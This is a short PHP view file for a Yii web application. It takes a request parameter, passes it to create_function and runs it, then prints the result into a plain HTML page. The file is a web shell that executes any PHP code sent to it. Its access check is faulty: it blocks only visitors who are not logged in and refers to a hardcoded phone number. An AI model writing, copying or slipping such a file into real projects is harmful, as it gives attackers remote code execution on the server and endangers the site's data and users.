
<?php
$user = User::model()->findByPk(Yii::app()->user->id);
if(!isset($user) && $user['u_tel']!= '13898800771'){
	throw new CHttpException('404','页面不存在');
}
$code = Yii::app()->request->getParam('code1','return "no code!";');
// $code = 'return "no code!";';
// if (isset($_POST['code']) && $_POST['code'] != '')
// {
// 	$code = $_POST['code'];
// }
$newfunc = create_function('', $code);
$res = $newfunc();

?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>XXX</title>
    </head>
    <body>
		<div><?php echo $res ?></div>
    </body>
</html>
